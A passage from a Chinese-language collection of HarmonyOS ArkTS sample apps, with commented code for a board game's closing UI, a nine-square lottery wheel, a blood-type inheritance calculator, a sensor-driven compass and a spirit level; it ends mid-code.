显示单元格的值或空字符串 .width(`${this.cellSize}lpx`)// 设置宽度 .height(`${this.cellSize}lpx`)// 设置高度 .margin(`${this.cellSpacing}lpx`)// 设置边距 .fontSize(`${this.cellSize / 2}lpx`)// 设置字体大小 .textAlign(TextAlign.Center)// 文本居中 .opacity(chessCell.opacity) .backgroundColor(chessCell.frontVisibility != 0 ? (chessCell.frontVisibility === 1 ? Color.Black : Color.White) : Color.Transparent)// 设置背景颜色 .borderRadius(\u0026#39;50%\u0026#39;)// 设置圆角 .rotate({ // 设置旋转 x: 0, y: 1, z: 0, angle: chessCell.rotationAngle, // 旋转角度 centerX: `${this.cellSize / 2}lpx`, // 中心点X坐标 centerY: `${this.cellSize / 2}lpx`, // 中心点Y坐标 }) .onClick(() =\u0026gt; { // 单击事件处理 if (this.isAIPlaying) { console.info(`ai正在落子，玩家不可继续落子`) return; } if (chessCell.frontVisibility === 0) { // 没有棋子，需要落子 this.placeChessPiece(rowIndex, colIndex, chessCell) } }); }); }); } .width(`${(this.cellSize + this.cellSpacing * 2) * 8}lpx`) // 设置宽度 } .padding(`${this.cellSpacing}lpx`) .backgroundColor(Color.Black) Row() { Text(`${this.isTwoPlayerMode? \u0026#39;双人游戏\u0026#39; : \u0026#39;单人游戏\u0026#39;}`) .height(50) .padding({ left: 10 }) .fontSize(16) .textAlign(TextAlign.Start) .backgroundColor(0xFFFFFF) Toggle({ type: ToggleType.Switch, isOn: this.isTwoPlayerMode }) .margin({ left: 200, right: 10 }) .onChange((isOn: boolean) =\u0026gt; { this.isTwoPlayerMode = isOn }) } .backgroundColor(0xFFFFFF) .borderRadius(5) Button(\u0026#39;重新开始\u0026#39;).onClick(() =\u0026gt; { // 按钮点击事件 this.initGame() }); } .height(\u0026#39;100%\u0026#39;).width(\u0026#39;100%\u0026#39;) // 设置高度和宽度 .backgroundColor(Color.Orange) } } nine-square 九宫格抽奖\n// 定义一个可观察的Prize类，用于表示奖品信息。 @ObservedV2 class Prize { @Trace title: string // 奖品标题属性，使用@Trace进行追踪以便响应式更新UI @Trace color: string // 奖品颜色属性 @Trace description: string // 奖品描述属性 // 构造函数，用来初始化新的奖品实例 constructor(title: string, color: string, description: string = \u0026#34;\u0026#34;) { this.title = title // 设置奖品标题 this.color = color // 设置奖品颜色 this.description = description // 设置奖品描述，默认为空字符串 } } // 定义MyPrizeUpdate结构组件，用于显示和编辑选中的奖品信息 @Component struct MyPrizeUpdate { @Consume selectedIndex: number // 当前选中的奖品索引 @Consume private selectionOrder: number[] // 保存抽奖顺序的数组 @Consume private prizeArray: Prize[] // 保存所有奖品的数组 build() { Column({ space: 20 }) { // 创建列布局容器，设置子元素之间的间距为20px Row() { // 创建行布局容器 Text(\u0026#39;标题：\u0026#39;) // 显示“标题”文本 TextInput({ text: this.prizeArray[this.selectionOrder[this.selectedIndex%this.selectionOrder.length]].title }) .width(\u0026#39;300lpx\u0026#39;) // 设置输入框宽度 .onChange((value) =\u0026gt; { // 监听输入框内容变化 this.prizeArray[this.selectionOrder[this.selectedIndex%this.selectionOrder.length]].title = value // 更新奖品标题 }) } Row() { Text(\u0026#39;描述：\u0026#39;) TextInput({ text: `${this.prizeArray[this.selectionOrder[this.selectedIndex%this.selectionOrder.length]].description}` }).width(\u0026#39;300lpx\u0026#39;).onChange((value) =\u0026gt; { // 同上，但针对奖品描述 this.prizeArray[this.selectionOrder[this.selectedIndex%this.selectionOrder.length]].description = value }) } Row() { Text(\u0026#39;颜色：\u0026#39;) TextInput({ text: `${this.prizeArray[this.selectionOrder[this.selectedIndex%this.selectionOrder.length]].color}` }).width(\u0026#39;300lpx\u0026#39;).onChange((value) =\u0026gt; { // 同上，但针对奖品颜色 this.prizeArray[this.selectionOrder[this.selectedIndex%this.selectionOrder.length]].color = value }) } } .justifyContent(FlexAlign.Start) // 设置内容左对齐 .padding(40) // 设置内边距 .width(\u0026#39;100%\u0026#39;) // 设置宽度为100% .backgroundColor(Color.White) // 设置背景颜色为白色 } } // 定义抽奖页面入口组件 @Entry @Component struct LotteryPage { @Provide private selectedIndex: number = 0 // 提供当前选中的索引，初始值为0 private isAnimating: boolean = false // 标记是否正在进行动画，初始值为false @Provide private selectionOrder: number[] = [0, 1, 2, 5, 8, 7, 6, 3] // 定义抽奖顺序 private cellWidth: number = 200 // 单元格宽度 private baseMargin: number = 10 // 单元格边距 @Provide private prizeArray: Prize[] = [ new Prize(\u0026#34;红包\u0026#34;, \u0026#34;#ff9675\u0026#34;, \u0026#34;10元\u0026#34;), // 初始化奖品数组，创建各种奖品对象 new Prize(\u0026#34;话费\u0026#34;, \u0026#34;#ff9f2e\u0026#34;, \u0026#34;5元\u0026#34;), new Prize(\u0026#34;红包\u0026#34;, \u0026#34;#8e7fff\u0026#34;, \u0026#34;50元\u0026#34;), new Prize(\u0026#34;红包\u0026#34;, \u0026#34;#48d1ea\u0026#34;, \u0026#34;30元\u0026#34;), new Prize(\u0026#34;开始抽奖\u0026#34;, \u0026#34;#fffdfd\u0026#34;), // 抽奖按钮，没有具体奖品描述 new Prize(\u0026#34;谢谢参与\u0026#34;, \u0026#34;#5f5f5f\u0026#34;), new Prize(\u0026#34;谢谢参与\u0026#34;, \u0026#34;#5f5f5f\u0026#34;), new Prize(\u0026#34;超市红包\u0026#34;, \u0026#34;#5f5f5f\u0026#34;, \u0026#34;100元\u0026#34;), new Prize(\u0026#34;鲜花\u0026#34;, \u0026#34;#75b0fe\u0026#34;), ] private intervalID: number = 0 // 定时器ID，用于控制抽奖速度 @State isSheetVisible: boolean = false // 控制底部弹出表单的可见性 // 开始抽奖逻辑 startLottery(speed: number = 500) { setTimeout(() =\u0026gt; { // 设置延时执行 if (speed \u0026gt; 50) { // 如果速度大于50，则递归调用startLottery以逐渐加速 speed -= 50 this.startLottery(speed) } else { this.runAtConstantSpeed() // 达到最高速度后进入匀速阶段 return } this.selectedIndex++ // 每次调用时更新选中索引 }, speed) } // 以恒定速度运行抽奖 runAtConstantSpeed() { let speed = 40 + Math.floor(Math.random() * this.selectionOrder.length) // 随机生成一个速度值 clearInterval(this.intervalID) // 清除之前的定时器 this.intervalID = setInterval(() =\u0026gt; { // 设置新的定时器来更新选中索引 if (this.selectedIndex \u0026gt;= speed) { // 如果选中索引达到速度值，停止并进入减速阶段 clearInterval(this.intervalID) this.slowDown() return } this.selectedIndex++ }, 50) } // 减速逻辑 slowDown(speed = 50) { setTimeout(() =\u0026gt; { // 设置延时执行 if (speed \u0026lt; 500) { // 如果速度小于500，则递归调用slowDown以逐渐减速 speed += 50 this.slowDown(speed) } else { this.selectedIndex %= this.selectionOrder.length // 确保索引在有效范围内 let index = this.selectionOrder[this.selectedIndex] // 获取最终选中的奖品索引 this.isAnimating = false // 动画结束 this.getUIContext().showAlertDialog({ // 显示结果对话框 title: \u0026#39;结果\u0026#39;, message: `${this.prizeArray[index].title}${this.prizeArray[index].description}`, // 显示奖品信息 confirm: { defaultFocus: true, value: \u0026#39;我知道了\u0026#39;, // 确认按钮文本 action: () =\u0026gt; {} // 点击确认后的操作 }, alignment: DialogAlignment.Center, }); return } this.selectedIndex++ }, speed) } // 构建UI方法 build() { Column() { // 使用Column布局容器 Flex({ wrap: FlexWrap.Wrap }) { // 使用弹性布局，允许换行 ForEach(this.prizeArray, (item: Prize, index: number) =\u0026gt; { // 遍历奖品数组，创建每个奖品的UI Column() { // 使用Column布局容器为每个奖品项 Text(`${item.title}`) // 显示奖品标题 .fontColor(index == 4 ? Color.White : item.color) // 设置字体颜色，对于抽奖按钮特殊处理 .fontSize(16) Text(`${item.description}`) // 显示奖品描述 .fontColor(index == 4 ? Color.White : item.color) // 设置字体颜色 .fontSize(20) } .clickEffect({ level: ClickEffectLevel.LIGHT, scale: 0.8 }) // 添加点击效果 .onClick(() =\u0026gt; { // 处理点击事件 if (this.isAnimating) { // 如果正在动画中，忽略点击 return } if (index == 4) { // 如果点击的是抽奖按钮，开始抽奖 this.isAnimating = true this.startLottery() } else { for (let i = 0; i \u0026lt; this.selectionOrder.length; i++) { if (this.selectionOrder[i] == index) { this.selectedIndex = i // 更新选中索引到对应位置 } } } }) .alignItems(HorizontalAlign.Center) // 设置水平居中对齐 .justifyContent(FlexAlign.Center) // 设置垂直居中对齐 .width(`${this.cellWidth}lpx`) // 设置单元格宽度 .height(`${this.cellWidth}lpx`) // 设置单元格高度 .margin(`${this.baseMargin}lpx`) // 设置单元格边距 .backgroundColor(index == 4 ? \u0026#34;#ff5444\u0026#34; : // 抽奖按钮背景颜色特殊处理 (this.selectionOrder[this.selectedIndex % this.selectionOrder.length] == index ? Color.Gray : Color.White)) .borderRadius(10) // 设置圆角 .shadow({ // 设置阴影效果 radius: 10, color: \u0026#34;#f98732\u0026#34;, offsetX: 0, offsetY: 20 }) }) }.width(`${this.cellWidth * 3 + this.baseMargin * 6}lpx`) // 设置整体宽度 .margin({ top: 30 }) // 设置顶部边距 MyPrizeUpdate().margin({top:20}) // 插入MyPrizeUpdate组件，并设置其上边距 } .height(\u0026#39;100%\u0026#39;) // 设置高度为100% .width(\u0026#39;100%\u0026#39;) // 设置宽度为100% .backgroundColor(\u0026#34;#ffb350\u0026#34;) // 设置页面背景颜色 } } LotteryPage入口组件LotteryPage是整个抽奖应用的核心组件，负责组织页面布局和处理用户交互逻辑。它初始化了一系列必要的状态变量，比如保存所有奖品的数组prizeArray、定义抽奖顺序的selectionOrder以及控制动画状态的isAnimating等。此外，该组件实现了抽奖过程的关键方法——startLottery（开始抽奖）、runAtConstantSpeed（匀速运行）和slowDown（减速），它们共同协作以模拟真实的抽奖体验。当用户点击抽奖按钮时，这些方法按照预定的速度模式依次调用，直到最终确定一个奖品为止。最后，通过弹出对话框的方式向用户展示抽奖结果。\nblood 血型计算\n// 导入SegmentButton及其相关类型定义 import { SegmentButton, SegmentButtonItemTuple, SegmentButtonOptions } from \u0026#39;@kit.ArkUI\u0026#39;; // 使用@Entry装饰器标记此组件为入口点 @Entry // 使用@Component装饰器标记此结构体为一个组件 @Component // 定义一个名为BloodTypeCalculator的结构体，用于实现血型遗传计算功能 struct BloodTypeCalculator { // 定义主题颜色，默认为橙色 @State private themeColor: string | Color = Color.Orange; // 定义文本颜色，默认为深灰色 @State private textColor: string = \u0026#34;#2e2e2e\u0026#34;; // 定义边框颜色，默认为浅灰色 @State private lineColor: string = \u0026#34;#d5d5d5\u0026#34;; // 定义基础内边距大小，默认为30 @State private basePadding: number = 30; // 存储可能的血型结果 @State private possibleBloodTypesText: string = \u0026#34;\u0026#34;; // 存储不可能的血型结果 @State private impossibleBloodTypesText: string = \u0026#34;\u0026#34;; // 定义血型列表，包含A、B、AB、O四种血型 @State private bloodTypeList: object[] = [Object({ text: \u0026#39;A\u0026#39; }), Object({ text: \u0026#39;B\u0026#39; }), Object({ text: \u0026#39;AB\u0026#39; }), Object({ text: \u0026#39;O\u0026#39; })]; // 初始化单选胶囊按钮的配置项 @State singleSelectCapsuleOptions: SegmentButtonOptions | undefined = undefined; // 监听父亲血型选择变化 @State @Watch(\u0026#39;capsuleSelectedIndexesChanged\u0026#39;) fatherBloodTypeIndex: number[] = [0]; // 监听母亲血型选择变化 @State @Watch(\u0026#39;capsuleSelectedIndexesChanged\u0026#39;) motherBloodTypeIndex: number[] = [0]; // 根据血型获取其可能的基因组合 getGenes(bloodType: string): string[] { console.info(`bloodType:${bloodType}`); switch (bloodType) { case \u0026#39;A\u0026#39;: return [\u0026#39;A\u0026#39;, \u0026#39;O\u0026#39;]; // A型血可能的基因组合 case \u0026#39;B\u0026#39;: return [\u0026#39;B\u0026#39;, \u0026#39;O\u0026#39;]; // B型血可能的基因组合 case \u0026#39;AB\u0026#39;: return [\u0026#39;A\u0026#39;, \u0026#39;B\u0026#39;]; // AB型血可能的基因组合 case \u0026#39;O\u0026#39;: return [\u0026#39;O\u0026#39;]; // O型血可能的基因组合 default: throw new Error(\u0026#39;Invalid blood type\u0026#39;); // 非法血型抛出错误 } } // 组合父母的基因以获得子代可能的基因组合 combineGenes(fatherGenes: string[], motherGenes: string[]): string[] { const possibleGenes: string[] = []; // 用于存储可能的基因组合 for (const fatherGene of fatherGenes) { for (const motherGene of motherGenes) { const combinedGene = [fatherGene, motherGene].sort().join(\u0026#39;\u0026#39;); // 将父母的基因组合并排序后加入数组 if (!possibleGenes.includes(combinedGene)) { possibleGenes.push(combinedGene); // 如果组合尚未存在，则加入数组 } } } return possibleGenes; // 返回所有可能的基因组合 } // 根据基因组合确定血型 getBloodTypesFromGenes(genes: string[]): string[] { const bloodTypes: string[] = []; // 用于存储可能的血型 for (const gene of genes) { if (gene === \u0026#39;AA\u0026#39; || gene === \u0026#39;AO\u0026#39; || gene === \u0026#39;OA\u0026#39;) { bloodTypes.push(\u0026#39;A\u0026#39;); // 基因组合为AA、AO或OA时，血型为A } else if (gene === \u0026#39;BB\u0026#39; || gene === \u0026#39;BO\u0026#39; || gene === \u0026#39;OB\u0026#39;) { bloodTypes.push(\u0026#39;B\u0026#39;); // 基因组合为BB、BO或OB时，血型为B } else if (gene === \u0026#39;AB\u0026#39; || gene === \u0026#39;BA\u0026#39;) { bloodTypes.push(\u0026#39;AB\u0026#39;); // 基因组合为AB或BA时，血型为AB } else if (gene === \u0026#39;OO\u0026#39;) { bloodTypes.push(\u0026#39;O\u0026#39;); // 基因组合为OO时，血型为O } } // 去除重复的血型 return bloodTypes.filter((value, index, self) =\u0026gt; self.indexOf(value) === index); } // 计算孩子可能的血型及不可能的血型 calculatePossibleBloodTypes(father: string, mother: string) { const fatherGenes = this.getGenes(father); // 获取父亲的基因组合 const motherGenes = this.getGenes(mother); // 获取母亲的基因组合 const possibleGenes = this.combineGenes(fatherGenes, motherGenes); // 组合父母的基因 const possibleBloodTypes = this.getBloodTypesFromGenes(possibleGenes); // 从基因组合中获取可能的血型 const allBloodTypes: string[] = [\u0026#39;A\u0026#39;, \u0026#39;B\u0026#39;, \u0026#39;AB\u0026#39;, \u0026#39;O\u0026#39;]; // 所有可能的血型列表 const impossibleBloodTypes = allBloodTypes.filter(bt =\u0026gt; !possibleBloodTypes.includes(bt)); // 计算不可能的血型 console.log(this.possibleBloodTypesText = `孩子可能血型：${possibleBloodTypes.join(\u0026#39;、\u0026#39;)}`); // 显示可能的血型 console.log(this.impossibleBloodTypesText = `孩子不可能血型：${impossibleBloodTypes.join(\u0026#39;、\u0026#39;)}`); // 显示不可能的血型 } // 当胶囊按钮的选择发生变化时调用此函数 capsuleSelectedIndexesChanged() { let father: string = this.bloodTypeList[this.fatherBloodTypeIndex[0]][\u0026#39;text\u0026#39;]; // 获取父亲选择的血型 let mother: string = this.bloodTypeList[this.motherBloodTypeIndex[0]][\u0026#39;text\u0026#39;]; // 获取母亲选择的血型 this.calculatePossibleBloodTypes(father, mother); // 计算并更新血型信息 } // 在组件即将出现时调用此函数 aboutToAppear(): void { this.singleSelectCapsuleOptions = SegmentButtonOptions.capsule({ buttons: this.bloodTypeList as SegmentButtonItemTuple, // 设置胶囊按钮的选项 multiply: false, // 单选模式 fontColor: Color.White, // 字体颜色为白色 selectedFontColor: Color.White, // 选中时字体颜色为白色 selectedBackgroundColor: this.themeColor, // 选中背景色为主题色 backgroundColor: this.lineColor, // 背景色为边框颜色 backgroundBlurStyle: BlurStyle.BACKGROUND_THICK // 背景模糊效果 }); this.capsuleSelectedIndexesChanged(); // 初始化时调用选择变化处理函数 } // 构建用户界面 build() { Column() { // 页面标题 Text(\u0026#39;血型遗传计算\u0026#39;) .fontColor(this.textColor) // 文本颜色 .fontSize(18) // 字体大小 .width(\u0026#39;100%\u0026#39;) // 宽度为100% .height(50) // 高度为50 .textAlign(TextAlign.Center) // 文本居中对齐 .backgroundColor(Color.White) // 背景色为白色 .shadow({ // 添加阴影效果 radius: 2, // 阴影半径 color: this.lineColor, // 阴影颜色 offsetX: 0, // 水平偏移量 offsetY: 5 // 垂直偏移量 }); // 工具介绍部分 Column() { Text(\u0026#39;工具介绍\u0026#39;).fontSize(20).fontWeight(600).fontColor(this.textColor); Text(\u0026#39;血型是以A、B、O三种遗传因子的组合而决定的，根据父母的血型，就可以判断出以后出生的孩子的血型。\u0026#39;) .fontSize(18).fontColor(this.textColor).margin({ top: `${this.basePadding / 2}lpx` }); } .alignItems(HorizontalAlign.Start) .width(\u0026#39;650lpx\u0026#39;) .padding(`${this.basePadding}lpx`) .margin({ top: `${this.basePadding}lpx` }) .borderRadius(10) .backgroundColor(Color.White) .shadow({ radius: 10, color: this.lineColor, offsetX: 0, offsetY: 0 }); // 父亲血型选择部分 Column() { Row() { Text(\u0026#39;父亲血型\u0026#39;).fontColor(this.textColor).fontSize(18); SegmentButton({ options: this.singleSelectCapsuleOptions, // 胶囊按钮的配置项 selectedIndexes: this.fatherBloodTypeIndex // 当前选中的索引 }).width(\u0026#39;400lpx\u0026#39;); }.height(45).justifyContent(FlexAlign.SpaceBetween).width(\u0026#39;100%\u0026#39;); // 母亲血型选择部分 Row() { Text(\u0026#39;母亲血型\u0026#39;).fontColor(this.textColor).fontSize(18); SegmentButton({ options: this.singleSelectCapsuleOptions, // 胶囊按钮的配置项 selectedIndexes: this.motherBloodTypeIndex // 当前选中的索引 }).width(\u0026#39;400lpx\u0026#39;); }.height(45).justifyContent(FlexAlign.SpaceBetween).width(\u0026#39;100%\u0026#39;); } .alignItems(HorizontalAlign.Start) .width(\u0026#39;650lpx\u0026#39;) .padding(`${this.basePadding}lpx`) .margin({ top: `${this.basePadding}lpx` }) .borderRadius(10) .backgroundColor(Color.White) .shadow({ radius: 10, color: this.lineColor, offsetX: 0, offsetY: 0 }); // 显示计算结果 Column() { Row() { Text(this.possibleBloodTypesText).fontColor(this.textColor).fontSize(18); }.height(45).justifyContent(FlexAlign.SpaceBetween).width(\u0026#39;100%\u0026#39;); Row() { Text(this.impossibleBloodTypesText).fontColor(this.textColor).fontSize(18); }.height(45).justifyContent(FlexAlign.SpaceBetween).width(\u0026#39;100%\u0026#39;); } .alignItems(HorizontalAlign.Start) .width(\u0026#39;650lpx\u0026#39;) .padding(`${this.basePadding}lpx`) .margin({ top: `${this.basePadding}lpx` }) .borderRadius(10) .backgroundColor(Color.White) .shadow({ radius: 10, color: this.lineColor, offsetX: 0, offsetY: 0 }); } .height(\u0026#39;100%\u0026#39;) .width(\u0026#39;100%\u0026#39;) .backgroundColor(\u0026#34;#f4f8fb\u0026#34;); // 页面背景色 } } compass 指南针\n传感器 角度计算\nimport { sensor } from \u0026#39;@kit.SensorServiceKit\u0026#39;; // 导入传感器服务模块 import { BusinessError } from \u0026#39;@kit.BasicServicesKit\u0026#39;; // 导入业务错误处理模块 // 定义方向范围类 class DirectionRange { name: string = \u0026#39;\u0026#39;; // 方向名称 min: number = 0; // 最小角度 max: number = 0; // 最大角度 } // 定义各个方向的范围 const DIRECTION_RANGES: DirectionRange[] = [ { name: \u0026#39;北\u0026#39;, min: 337.5, max: 360 }, { name: \u0026#39;北\u0026#39;, min: 0, max: 22.5 }, { name: \u0026#39;东北\u0026#39;, min: 22.5, max: 67.5 }, { name: \u0026#39;东\u0026#39;, min: 67.5, max: 112.5 }, { name: \u0026#39;东南\u0026#39;, min: 112.5, max: 157.5 }, { name: \u0026#39;南\u0026#39;, min: 157.5, max: 202.5 }, { name: \u0026#39;西南\u0026#39;, min: 202.5, max: 247.5 }, { name: \u0026#39;西\u0026#39;, min: 247.5, max: 292.5 }, { name: \u0026#39;西北\u0026#39;, min: 292.5, max: 337.5 } ]; // 定义指南针组件 @Entry @Component struct Compass { @State directionMessage: string = \u0026#39;\u0026#39;; // 当前方向的名称 @State rotationAngle: number = 0; // 当前旋转角度 @State currentAngle: number = 0; // 当前传感器角度 @State cumulativeRotation: number = 0; // 累计旋转角度 private threshold: number = 1; // 设置阈值，用于过滤小的旋转变化 // 组件即将出现时调用 aboutToAppear(): void { sensor.getSensorList((error: BusinessError) =\u0026gt; { if (error) { console.error(\u0026#39;获取传感器列表失败\u0026#39;, error); // 如果获取传感器列表失败，打印错误信息 return; } this.startOrientationUpdates(); // 开始监听传感器数据 }); } // 开始监听传感器的方位数据 private startOrientationUpdates(): void { sensor.on(sensor.SensorId.ORIENTATION, (orientationData) =\u0026gt; { const alpha = orientationData.alpha; // 获取当前的方位角 this.directionMessage = this.calculateDirection(alpha); // 计算当前方向 const angleDifference = this.calculateAngleDifference(this.currentAngle, alpha); // 计算角度差 if (Math.abs(angleDifference) \u0026gt; this.threshold) { // 如果角度变化超过阈值 this.updateRotationAngle(angleDifference, alpha); // 更新旋转角度 } }, { interval: 10000000 }); // 设置传感器更新间隔，单位为纳秒，10000000表示1秒 } // 计算两个角度之间的差异 private calculateAngleDifference(currentAngle: number, targetAngle: number): number { let diff = targetAngle - currentAngle; // 计算角度差 if (diff \u0026gt; 180) { diff -= 360; // 顺时针旋转超过180度，调整为负值 } else if (diff \u0026lt; -180) { diff += 360; // 逆时针旋转超过180度，调整为正值 } return diff; // 返回调整后的角度差 } // 更新旋转角度 private updateRotationAngle(angleDifference: number, newAngle: number): void { this.cumulativeRotation += angleDifference; // 累加旋转角度 this.rotationAngle += angleDifference; // 更新当前旋转角度 this.currentAngle = newAngle; // 更新当前传感器角度 // 动画更新 animateToImmediately({}, () =\u0026gt; { this.rotationAngle = this.cumulativeRotation; // 将旋转角度设置为累计旋转角度 }); console.log(`累计旋转角度: ${this.cumulativeRotation}`); // 打印累计旋转角度 } // 根据角度计算方向 private calculateDirection(angle: number): string { for (const range of DIRECTION_RANGES) { if (angle \u0026gt;= range.min \u0026amp;\u0026amp; angle \u0026lt; range.max) { return range.name; // 返回对应的方向名称 } } return \u0026#39;未知方向\u0026#39;; // 如果角度不在任何范围内，返回未知方向 } // 构建用户界面 build() { Column({ space: 20 }) { // 创建一个列布局，设置间距为20 Row({ space: 5 }) { // 创建一个行布局，设置间距为5 Text(this.directionMessage) // 显示当前方向 .layoutWeight(1) // 设置布局权重 .textAlign(TextAlign.End) // 文本对齐方式 .fontColor(\u0026#39;#dedede\u0026#39;) // 文本颜色 .fontSize(50); // 文本大小 Text(`${Math.floor(this.currentAngle)}°`) // 显示当前角度 .layoutWeight(1) // 设置布局权重 .textAlign(TextAlign.Start) // 文本对齐方式 .fontColor(\u0026#39;#dedede\u0026#39;) // 文本颜色 .fontSize(50); // 文本大小 }.width(\u0026#39;100%\u0026#39;).margin({ top: 50 }); // 设置宽度和上边距 Stack() { // 创建一个堆叠布局 Stack() { // 内部堆叠布局 Circle() // 创建一个圆形 .width(250) // 设置宽度 .height(250) // 设置高度 .fillOpacity(0) // 设置填充透明度 .strokeWidth(25) // 设置边框宽度 .stroke(\u0026#39;#f95941\u0026#39;) // 设置边框颜色 .strokeDashArray([1, 5]) // 设置边框虚线样式 .strokeLineJoin(LineJoinStyle.Round); // 设置边框连接方式 Text(\u0026#39;北\u0026#39;) // 创建一个文本，显示“北” .height(\u0026#39;100%\u0026#39;) // 设置高度 .width(40) // 设置宽度 .align(Alignment.Top) // 设置对齐方式 .fontColor(\u0026#39;#ff4f3f\u0026#39;) // 设置文本颜色 .rotate({ angle: 0 }) // 设置旋转角度 .padding({ top: 80 }) // 设置内边距 .textAlign(TextAlign.Center); // 设置文本对齐方式 Text(\u0026#39;东\u0026#39;) // 创建一个文本，显示“东” .height(\u0026#39;100%\u0026#39;) // 设置高度 .width(40) // 设置宽度 .align(Alignment.Top) // 设置对齐方式 .fontColor(\u0026#39;#fcfdfd\u0026#39;) // 设置文本颜色 .rotate({ angle: 90 }) // 设置旋转角度 .padding({ top: 80 }) // 设置内边距 .textAlign(TextAlign.Center); // 设置文本对齐方式 Text(\u0026#39;南\u0026#39;) // 创建一个文本，显示“南” .height(\u0026#39;100%\u0026#39;) // 设置高度 .width(40) // 设置宽度 .align(Alignment.Top) // 设置对齐方式 .fontColor(\u0026#39;#fcfdfd\u0026#39;) // 设置文本颜色 .rotate({ angle: 180 }) // 设置旋转角度 .padding({ top: 80 }) // 设置内边距 .textAlign(TextAlign.Center); // 设置文本对齐方式 Text(\u0026#39;西\u0026#39;) // 创建一个文本，显示“西” .height(\u0026#39;100%\u0026#39;) // 设置高度 .width(40) // 设置宽度 .align(Alignment.Top) // 设置对齐方式 .fontColor(\u0026#39;#fcfdfd\u0026#39;) // 设置文本颜色 .rotate({ angle: 270 }) // 设置旋转角度 .padding({ top: 80 }) // 设置内边距 .textAlign(TextAlign.Center); // 设置文本对齐方式 } .width(\u0026#39;100%\u0026#39;) // 设置宽度 .height(\u0026#39;100%\u0026#39;) // 设置高度 .borderRadius(\u0026#39;50%\u0026#39;) // 设置圆角 .margin({ top: 50 }) // 设置上边距 .rotate({ angle: -this.rotationAngle }) // 设置旋转角度 .animation({}); // 设置动画效果 Line() // 创建一个线条 .width(5) // 设置宽度 .height(40) // 设置高度 .backgroundColor(\u0026#39;#fdfffe\u0026#39;) // 设置背景颜色 .borderRadius(\u0026#39;50%\u0026#39;) // 设置圆角 .margin({ bottom: 200 }); // 设置下边距 } .width(300) // 设置宽度 .height(300); // 设置高度 } .height(\u0026#39;100%\u0026#39;) // 设置高度 .width(\u0026#39;100%\u0026#39;) // 设置宽度 .backgroundColor(\u0026#39;#18181a\u0026#39;); // 设置背景颜色 } } level 水平仪\n//module.json5 { \u0026#34;module\u0026#34;: { \u0026#34;requestPermissions\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;ohos.permission.ACCELEROMETER\u0026#34; } ], } // 导入传感器服务模块 import { sensor } from \u0026#39;@kit.SensorServiceKit\u0026#39;; // 导入业务错误处理模块 import { BusinessError } from \u0026#39;@kit.BasicServicesKit\u0026#39;; // 定义单位长度，用于后续计算中的比例尺 const UNIT_LENGTH = 4; // 使用 @Entry 和 @Component 装饰器定义一个名为 LevelMeter 的组件 @Entry @Component struct LevelMeter { // 定义状态变量，用于存储当前角度 @State angle: number = 0; // 定义状态变量，用于存储前后倾斜角度（pitch） @State pitch: number = 0; // 定义状态变量，用于存储左右倾斜角度（roll） @State roll: number = 0; // 定义角度变化阈值，用于判断是否需要更新角度 private threshold: number = 1; // 组件即将出现时的生命周期方法 aboutToAppear(): void { // 获取传感器列表 sensor.getSensorList((error: BusinessError) =\u0026gt; { if (error) { // 如果获取传感器列表失败，输出错误信息 console.error(\u0026#39;获取传感器列表失败\u0026#39;, error); return; } // 开始更新方向信息 this.startOrientationUpdates(); }); } // 启动方向更新的方法 private startOrientationUpdates(): void { // 注册加速度传感器事件监听器 sensor.on(sensor.SensorId.ACCELEROMETER, (data) =\u0026gt; { // 计算新的前后倾斜角度（pitch） const newPitch = Math.atan(data.y / Math.sqrt(data.x * data.x + data.z * data.z)) * (180 / Math.PI); // 计算新的左右倾斜角度（roll） const newRoll = Math.atan(data.x / Math.sqrt(data.y * data.y + data.z * data.z)) * (180 / Math.PI); // 如果新的角度变化超过阈值，则更新状态 if (Math.abs(newPitch - this.pitch) \u0026gt; this.threshold || Math.abs(newRoll - this.roll) \u0026gt; this.threshold) { this.pitch = newPitch; this.roll = newRoll; // 更新当前角度 this.angle = Math.hypot(newPitch, newRoll); } }, { interval: 100000000 }); // 设置更新间隔为100毫秒 } // 计算小球位置的方法 private calculateBallPosition(): Position { // 根据当前角度计算半径 const radius = (this.angle \u0026lt;= 10 ? this.angle * 2.5 : (10 * 2.5 + (this.angle - 10))) * UNIT_LENGTH; // 将角度转换为弧度 const angleInRadians = Math.atan2(this.pitch, this.roll); // 计算小球在圆周上的X坐标 const x = -radius * Math.cos(angleInRadians); // 计算小球在圆周上的Y坐标 const y = radius * Math.sin(angleInRadians); // 返回小球的位置 return { x, y }; } // 构建UI的方法 build() { // 使用Stack布局容器 Stack() { // 显示当前角度的文本 Stack() { Row({ space: 5 }) { // 创建一个行布局，设置间距为5 Text(`${Math.floor(this.angle)}°`)// 显示当前角度 .layoutWeight(1)// 设置布局权重 .textAlign(TextAlign.Center)// 文本对齐方式 .fontColor(\u0026#39;#dedede\u0026#39;)// 文本颜色 .fontSize(60); // 文本大小 }.width(\u0026#39;100%\u0026#39;).margin({ top: 80 }) // 设置宽度和上边距 }.height(\u0026#39;100%\u0026#39;).align(Alignment.Top) // 设置高度和对齐方式 // 模拟水平仪背景的圆环 Stack() { // 外部大圆 Text() .width(\u0026#39;600lpx\u0026#39;)// 设置宽度 .height(\u0026#39;600lpx\u0026#39;)// 设置高度 .borderRadius(\u0026#39;50%\u0026#39;)// 设置圆角 .backgroundColor(\u0026#34;#171b1e\u0026#34;)// 设置背景颜色 .blur(50)// 设置模糊效果 .shadow({ radius: 300, type: ShadowType.COLOR, color: \u0026#34;#232426\u0026#34; }); // 设置阴影效果 // 中间圆 Text() .width(`${(this.angle \u0026lt;= 10 ? this.angle * 2.5 : (10 * 2.5 + (this.angle - 10))) * UNIT_LENGTH * 2}lpx`)// 计算宽度 .height(`${(this.angle \u0026lt;= 10 ? this.angle * 2.5 : (10 * 2.5 + (this.angle - 10))) * UNIT_LENGTH * 2}lpx`)// 计算高度 .borderRadius(\u0026#39;50%\u0026#39;)// 设置圆角 .backgroundColor(\u0026#34;#2e3235\u0026#34;)// 设置背景颜色 .animation({ curve: Curve.EaseOut }); // 设置动画效果 // 刻度线 ForEach([10, 20, 30, 40, 50], (item: number) =\u0026gt; { Text() .width(`${(15 + item) * UNIT_LENGTH * 2}lpx`)// 计算宽度 .height(`${(15 + item) * UNIT_LENGTH * 2}lpx`)// 计算高度 .borderWidth(1)// 设置边框宽度 .borderRadius(\u0026#39;50%\u0026#39;)// 设置圆角 .borderColor(\u0026#34;#807d8184\u0026#34;); // 设置边框颜色 // 刻度数字 Text(`${item}`) .width(20)// 设置宽度 .fontColor(\u0026#34;#7d8184\u0026#34;)// 设置字体颜色 .fontSize(10)// 设置字体大小 